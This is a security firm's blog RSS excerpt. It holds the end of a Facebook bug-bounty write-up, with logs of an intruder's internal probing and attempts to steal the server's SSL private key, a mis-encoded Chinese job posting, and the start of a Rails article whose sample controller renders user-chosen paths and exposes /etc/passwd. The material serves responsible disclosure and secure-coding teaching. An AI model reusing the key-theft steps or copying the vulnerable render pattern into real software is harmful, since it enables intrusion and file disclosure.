(Looked like Mail OWA could be accessed directlyâ€¦)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;

&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;

&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;

&lt;p&gt;the July one seemed to be a server â€œdorkingâ€ and the September one seemed more vicious. Other than server â€œdorkingâ€ keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P&lt;br /&gt;
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Hereâ€™s the end of the story, and, generally speaking, it was a rather interesting experience xD&lt;br /&gt;
Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;

&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attention to in blog post ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE å¾µæ±‚è¡Œæ”¿å‡ºç´äººæ‰</title>
                <description>&lt;p&gt;ï¼ˆ2015.9.16 å·²çµæŸå¾µæ‰ï¼‰&lt;/p&gt;

&lt;p&gt;æˆ´å¤«å¯‡çˆ¾å³å°‡è¦é‚å…¥ç¬¬å››å€‹å¹´é ­ï¼Œåœ¨éå»çš„æ­²æœˆä¸­ï¼Œæˆ‘å€‘æ¨å»£è³‡å®‰çš„é‡è¦æ€§ã€å¼·èª¿å®‰å…¨é–‹ç™¼ã€‚æˆ‘å€‘å …æŒæä¾›æœ€é«˜å“è³ªçš„æ»²é€æ¸¬è©¦æœå‹™ï¼Œå”åŠ©ä¼æ¥­æ‰¾å‡ºéš±è—çš„è³‡å®‰å¨è„…ã€‚æˆ‘å€‘ä¹Ÿä¸æ–·ç²¾é€²æŠ€è¡“ï¼ŒæœŸè¨±è‡ªå·±èƒ½æˆç‚ºå…¨å°ç£ç¬¬ä¸€çš„æ»²é€æ¸¬è©¦åœ˜éšŠã€‚&lt;/p&gt;

&lt;p&gt;æ„Ÿè¬é€™äº›å¹´ä¾†æ¥­ç•Œæœ‹å‹å°æˆ‘å€‘çš„è‚¯å®šèˆ‡æ”¯æŒï¼Œæˆ´å¤«å¯‡çˆ¾å¾—ä»¥èŒå£¯ï¼Œå¦‚ä»Šï¼Œæˆ‘å€‘é‚„éœ€è¦ä¸€ä½è¡Œæ”¿å‡ºç´äººæ‰ï¼Œæˆ‘å€‘æ¸´æœ›æ‚¨çš„åŠ å…¥ï¼Œåšç‚ºæˆ´å¤«å¯‡çˆ¾ç©©å®šçš„åŠ›é‡ã€‚ç›¸é—œç´°ç¯€å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å”åŠ©è™•ç†åº¶å‹™æ€§è¡Œæ”¿å·¥ä½œï¼ˆæ¥è½ä¾†é›»ã€æ”¶ç™¼ã€æ¥å¾…ï¼‰&lt;/li&gt;
  &lt;li&gt;è² è²¬åˆç´„ç®¡ç†ã€å‡ºç¼ºè€ƒå‹¤ç®¡ç†ã€å¸³å‹™æ˜ç´°æ•´ç†&lt;/li&gt;
  &lt;li&gt;è¦åŠƒã€åŸ·è¡Œæ¡è³¼åº¶å‹™&lt;/li&gt;
  &lt;li&gt;æ‡‰æ”¶æ‡‰ä»˜æ¬¾é …èˆ‡é›¶ç”¨é‡‘ç®¡ç†&lt;/li&gt;
  &lt;li&gt;éŠ€è¡Œå¾€ä¾†èˆ‡ä¸€èˆ¬æ¬¾é …æ”¶ä»˜ä½œæ¥­&lt;/li&gt;
  &lt;li&gt;å”åŠ©ä¸»ç®¡åŸ·è¡Œç›¸é—œæ¥­å‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ™‚é–“&quot;&gt;å·¥ä½œæ™‚é–“&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œåœ°é»&quot;&gt;å·¥ä½œåœ°é»&lt;/h3&gt;
&lt;p&gt;å°åŒ—å¸‚ä¸­å±±å€å¾©èˆˆåŒ—è·¯ 168 è™Ÿ 10 æ¨“&lt;br /&gt;
ï¼ˆæ·é‹å—äº¬å¾©èˆˆç«™ï¼Œèµ°è·¯ç´„ä¸‰åˆ†é˜ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ¢ä»¶è¦æ±‚&quot;&gt;æ¢ä»¶è¦æ±‚&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;éœ€æœ‰å…©å¹´ä»¥ä¸Šç›¸é—œå·¥ä½œç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰è©¦ç®—è¡¨ï¼Œå…·ç¨ç«‹æ’°å¯«è©¦ç®—è¡¨å…¬å¼èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;ç¿’æ…£ä½¿ç”¨é›²ç«¯æœå‹™ï¼Œå¦‚ï¼šGoogle Drive, Dropbox æˆ–å…¶ä»–&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨ä½¿ç”¨éå°ˆæ¡ˆç®¡ç†ç³»çµ±ï¼Œå¦‚ï¼šTrello, Basecamp, Redmine æˆ–å…¶ä»–&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨å°‡æœƒä½¿ç”¨å°ˆæ¡ˆç®¡ç†ç³»çµ±ç®¡ç†å¹³æ—¥ä»»å‹™&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ MAC ä½¿ç”¨è€…&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨æœªä¾†çš„é›»è…¦æœƒæ˜¯ MACï¼Œæˆ‘å€‘å¸Œæœ›æ‚¨è¶Šå¿«é †æš¢ä½¿ç”¨é›»è…¦è¶Šå¥½&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ›¾ç¶“åšéè¡Œæ”¿ç›¸é—œè·å‹™ï¼Œä½†å°è¡Œæ”¿ä¸€è·æœ‰ä¸€å¥—è‡ªå·±çš„æƒ³æ³•&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æˆ‘å€‘æ˜¯æ–°å‰µå…¬å¸ï¼Œæˆ‘å€‘æ­¡è¿æ‚¨æŒ‘æˆ°æ—¢å®šçš„è¡Œæ”¿åˆ»ç‰ˆå°è±¡&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ç”Ÿæ´»é§­å®¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨ä¸éœ€è¦æœƒå¯«ç¨‹å¼ï¼Œä½†æ‚¨ç¿’æ…£è§€å¯Ÿç”Ÿæ´»ä¸­çš„è¦å¾‹ï¼Œä¸¦æƒ³è¾¦æ³•åˆ©ç”¨é€™äº›è¦å¾‹æœ‰æ•ˆç‡çš„è§£æ±ºå•é¡Œ&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œç’°å¢ƒ&quot;&gt;å·¥ä½œç’°å¢ƒ&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘æ³¨é‡å…¬å¸æ¯å€‹äººçš„èº«å¿ƒå¥åº·ï¼Œæ‰€ä»¥ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ‚¨æœƒåœ¨ä¸€å€‹é–‹é—Šçš„è¾¦å…¬ç’°å¢ƒå·¥ä½œ
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æœƒæ“æœ‰ä¸€å¼µ Aeron äººé«”å·¥å­¸æ¤…
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ¯é€±è£œæ»¿é£²æ–™ï¼ˆå¦æœ‰å’–å•¡æ©Ÿï¼‰ã€é›¶é£Ÿï¼Œè®“æ‚¨ä¿æŒå¿ƒæƒ…æ„‰å¿«
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;å…¬å¸æä¾›é£›é¢æ©Ÿè®“æ‚¨ç™¼æ´©å°ä¸»ç®¡çš„æ€¨æ°£
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å“¡å·¥ç¦åˆ©&quot;&gt;å“¡å·¥ç¦åˆ©&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ç¬¬ä¸€å¹´å³æœ‰ç‰¹ä¼‘ï¼ˆç…§æ¯”ä¾‹ï¼‰ï¼Œæ¯å¹´åº¦äº”å¤©å…¨è–ªç—…å‡&lt;/li&gt;
  &lt;li&gt;ä¸‰ç¯€ã€ç”Ÿæ—¥ç¦®é‡‘&lt;/li&gt;
  &lt;li&gt;æ¯å­£å“¡å·¥èšé¤&lt;/li&gt;
  &lt;li&gt;æ¯å¹´å“¡å·¥æ—…éŠ&lt;/li&gt;
  &lt;li&gt;æ¯å¹´å“¡å·¥å¥æª¢&lt;/li&gt;
  &lt;li&gt;å‹ä¿ã€å¥ä¿ã€å‹é€€&lt;/li&gt;
  &lt;li&gt;å®šæœŸå°ˆäººæŒ‰æ‘©æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 32,000 - 40,000 ï¼ˆä¿è­‰ 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ‡‰å¾µæ–¹å¼&quot;&gt;æ‡‰å¾µæ–¹å¼&lt;/h3&gt;
&lt;p&gt;è«‹ä¾†ä¿¡å°‡æ‚¨çš„å±¥æ­·ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting@devco.reï¼Œæ¨™é¡Œæ ¼å¼å¦‚ä¸‹ï¼š&lt;br /&gt;&lt;strong&gt;[æ‡‰å¾µ] è¡Œæ”¿å‡ºç´å°ˆå“¡ (æ‚¨çš„å§“å)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;æˆ‘å€‘æœƒåœ¨å…©é€±å…§ä¸»å‹•èˆ‡æ‚¨è¯ç¹«ã€‚å¯©æŸ¥æ–¹å¼æœƒæœ‰æ›¸å¯©ã€ç·šä¸Šæ¸¬é©—ä»¥åŠé¢è©¦ä¸‰å€‹éšæ®µã€‚æœ€å¿«å°‡æ–¼ä¹æœˆåˆé–‹å§‹é€²è¡Œç¬¬äºŒéšæ®µæ¸¬è©¦ï¼Œç…©è«‹è€å¿ƒç­‰å€™ã€‚&lt;br /&gt;å±¥æ­·è«‹æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œéœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
  &lt;li&gt;å­¸æ­·&lt;/li&gt;
  &lt;li&gt;å·¥ä½œç¶“æ­·&lt;/li&gt;
  &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
  &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆè«‹è‡ªè¡Œå°‹æ‰¾ç·šä¸Šæ¸¬é©—æ¸¬è©¦ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.doc&quot;&gt;DOC&lt;/a&gt;ã€&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚&lt;br /&gt;
è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;
&lt;p&gt;ç”±æ–¼æœ€è¿‘æ¥­å‹™è¼ƒç‚ºå¿™ç¢Œï¼Œè‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œé€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;æˆ‘å€‘é¸æ“‡å„ªå…ˆåœ¨éƒ¨è½æ ¼å…¬å¸ƒå¾µæ‰è³‡è¨Šï¼Œæ˜¯å¸Œæœ›æ‚¨ä¹Ÿå°å®‰å…¨è­°é¡Œæ„Ÿèˆˆè¶£ï¼Œå³ä½¿ä¸æ‡‚æŠ€è¡“ä¹Ÿæƒ³ç‚ºå°ç£è³‡å®‰ç›¡ä¸€é»åŠ›ã€‚å¦‚æœæ‚¨é™¤äº†è™•ç†åŸºæœ¬äº‹å‹™å¤–é‚„æœ‰æ›´å¤šæƒ³æ³•ï¼Œä¹Ÿæ­¡è¿èˆ‡æˆ‘å€‘è¯ç¹«ï¼Œæˆ‘å€‘æœƒä¿ç•™çµ¦æ‚¨ç™¼æ®çš„ç©ºé–“èˆ‡èª¿å‡è–ªæ°´ã€‚&lt;br /&gt;&lt;br /&gt;
ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘éƒ½æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼ŒæœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2015/08/19/devcore-2015-recruit/</link>
                <guid>https://devco.re/blog/2015/08/19/devcore-2015-recruit</guid>
                <pubDate>Wed, 19 Aug 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Rails å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„é¢¨éšª</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;å¾å®‰å…¨é–‹ç™¼çš„è§’åº¦ä¾†çœ‹ï¼ŒRuby on Rails æ˜¯ä¸€å¥—å¾ˆå‹å–„çš„æ¡†æ¶ã€‚å®ƒå¾æ¡†æ¶å±¤é¿å…äº†å¾ˆå¤šéå»ç¶²ç«™å¸¸å‡ºç¾çš„å®‰å…¨å•é¡Œï¼Œä¾‹å¦‚ä½¿ç”¨ ORM é¿å…å¤§éƒ¨åˆ†çš„ SQL injection å•é¡Œã€æœ‰å…§å»ºçš„ authenticity_token è®“é–‹ç™¼è€…ä¸å¿…ç‰¹åˆ¥ç…©æƒ± CSRFã€å¾æ©Ÿåˆ¶é¢è¦å®šé–‹ç™¼è€…ä½¿ç”¨ Strong Parameter é¿å… Mass Assignmentã€é è¨­è½‰åŒ–å±éšªå­—å…ƒé¿å… XSS ç­‰â€¦ã€‚&lt;/p&gt;

&lt;p&gt;å°±æˆ‘å€‘éå»&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;çš„ç¶“é©—ä¾†èªªï¼ŒRails ç¶²ç«™é›–ç„¶é‚„æ˜¯èƒ½æ‰¾åˆ°å•é¡Œï¼Œä½†ç›¸å°å•é¡Œè¼ƒå°‘ï¼Œè€Œä¸”å¾ˆå°‘å–®ç´”å› ç‚º Rails å¯«æ³•å•é¡Œæ‹¿åˆ°ç³»çµ±æ“ä½œæ¬Šã€‚è€Œä»Šå¤©è¦åˆ†äº«çš„ï¼Œæ˜¯åœ¨ä¸€æ¬¡æ»²é€æ¸¬è©¦ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„ä¾‹å­ï¼Œå› ç‚ºé–‹ç™¼è€…ä½¿ç”¨äº†å‹•æ…‹æ¨£æ¿è·¯å¾‘(Dynamic Render Paths)çš„å¯«æ³•&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;ï¼Œæœ€å¾Œé€ æˆäº†åš´é‡çš„çµæœã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;å‹•æ…‹æ¨£æ¿è·¯å¾‘ï¼ŒOWASP çš„&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;ä»‹ç´¹&lt;/a&gt;æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the â€œrenderâ€ method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;br /&gt;&lt;br /&gt;
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OWASP æ˜¯èªªï¼Œå¦‚æœä½ çš„æ¨£æ¿è·¯å¾‘æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œè€Œä¸”ä½¿ç”¨è€…å¯ä»¥æ§åˆ¶é‚£å€‹æ¨£æ¿è·¯å¾‘ï¼Œé‚£éº¼ä½¿ç”¨è€…å°±å¯ä»¥è®€å–åˆ°ä»»æ„æ¨£æ¿ï¼ŒåŒ…å«ç®¡ç†ä»‹é¢çš„æ¨£æ¿ã€‚é€™æ¨£çš„æè¿°æ„Ÿè¦ºé‚„å¥½ï¼Œä½†å°±æˆ‘å€‘çš„ç™¼ç¾ï¼Œé€™å…¶å¯¦æ˜¯æ›´åš´é‡çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œ(Insecure Direct Object References)ï¼Œç”šè‡³æœ‰æ©Ÿæœƒé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œ(Remote Code Execution)ï¼Œæ€éº¼èªªå‘¢ï¼Ÿæˆ‘å€‘ç›´æ¥çœ‹ä¸‹å»ã€‚&lt;/p&gt;

&lt;h3 id=&quot;åŸºæœ¬ç´°ç¯€&quot;&gt;åŸºæœ¬ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;ä¸€å€‹å‹•æ…‹æ¨£æ¿è·¯å¾‘çš„å¯«æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;index&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;è€Œ index çš„æ¨£æ¿å…§å®¹æ˜¯é€™æ¨£ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¦å¤–å»ºä¸€å€‹ demo æ¨£æ¿åšç¤ºæ„ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¯¦éš›æ¸¬è©¦ï¼Œå¦‚æœæˆ‘å€‘é€£åˆ° WelcomeController çš„ index actionï¼Œä¸å¸¶ä»»ä½•åƒæ•¸æœƒè®€å– index æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœå¸¶åƒæ•¸ page=demoï¼Œæœƒè®€å–åˆ° demo æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ï¼Œå¦‚æœæˆ‘å€‘çŸ¥é“ç®¡ç†ä»‹é¢çš„æ¨¡ç‰ˆè·¯å¾‘ï¼Œé€å‡ºè·¯å¾‘åƒæ•¸å°±å¯ä»¥è®€å–åˆ°ç®¡ç†ä»‹é¢ã€‚é€™å°±æ˜¯ OWASP æ‰€æè¿°çš„é¢¨éšªï¼Œæ”»æ“Šè€…å¾—ä»¥è®€å–ä»»æ„æ¨¡ç‰ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œç•¶æˆ‘å€‘å˜—è©¦é€å‡ºç³»çµ±çµ•å°è·¯å¾‘ä¾‹å¦‚ /etc/passwd &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;ï¼Œç¶²é ç«Ÿç„¶åå‡ºäº† /etc/passwd çš„å…§å®¹ï¼é€™å°±æ˜¯ä¹‹å‰æ‰€è¿°çš„ç›´æ¥å­˜å–ç‰©ä»¶å•é¡Œï¼Œå¯ä»¥éæ­·ç›®éŒ„ç€è¦½æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é€²éšæ”»æ“Š&quot;&gt;é€²éšæ”»æ“Š&lt;/h3&gt;

